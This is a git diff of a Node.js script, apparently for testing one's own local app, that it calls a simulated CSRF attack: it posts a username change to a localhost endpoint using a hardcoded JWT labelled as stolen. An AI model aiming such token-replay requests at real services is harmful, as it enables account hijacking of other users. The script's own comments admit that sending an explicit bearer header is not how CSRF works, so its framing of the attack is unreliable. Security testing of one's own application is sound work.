@@ -1,29 +1,41 @@
-const axios = require('axios');
+const axios = require("axios");
 
-// Target URL and Action (Change Email)
-const targetUrl = "http://localhost:5000/api/users/change-email"; // Replace with your target endpoint
+// This script simulates a CSRF attack by making a request to change a user's email
 
-// CSRF Payload
+// Target URL
+const targetUrl = "http://localhost:5000/api/users/change-username";
+
+// Malicious payload
 const payload = {
-  email: "malicious@example.com", // New email that the attacker wants to set
+  username: "hackedhacker",
 };
 
-// Assuming the attacker is trying to perform this request using a logged-in user
-const runCSRF = async () => {
-  const csrfToken = "yourCSRFTokenHere"; // CSRF token the attacker wants to forge
+// The JWT token would be stolen or already present in the victim's browser
+// For testing, you need to replace this with a valid JWT token from your application
+const stolenJwtToken =
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJTaGVyIG1zZHNkYW4iLCJpYXQiOjE3NDU2NzQ2MDMsImV4cCI6MTc0NTc2MTAwM30.fME2j6vqqK4Vk6rmkOr4Ym2Xk1kYXsoVBOu7_kn4jU8"; // Replace with a valid token
 
+const executeAttack = async () => {
   try {
+    // Make a request with the authorization header
+    // In a real CSRF attack, the browser would automatically include cookies
     const response = await axios.post(targetUrl, payload, {
       headers: {
         "Content-Type": "application/json",
-        "Authorization": "Bearer userAccessToken", // Token of the logged-in user
-        "X-CSRF-Token": csrfToken,  // CSRF Token from user's session or generated token
+        Authorization: `Bearer ${stolenJwtToken}`,
       },
     });
-    console.log("CSRF Attack Success - Status:", response.status, "| Response:", response.data);
-  } catch (err) {
-    console.error("CSRF Attack Failed - Error:", err.message);
+
+    console.log("CSRF Attack Successful!");
+    console.log("Status:", response.status);
+    console.log("Response:", response.data);
+  } catch (error) {
+    console.error("CSRF Attack Failed:", error.message);
+    if (error.response) {
+      console.log("Status:", error.response.status);
+      console.log("Response:", error.response.data);
+    }
   }
 };
 
-runCSRF();
+executeAttack();
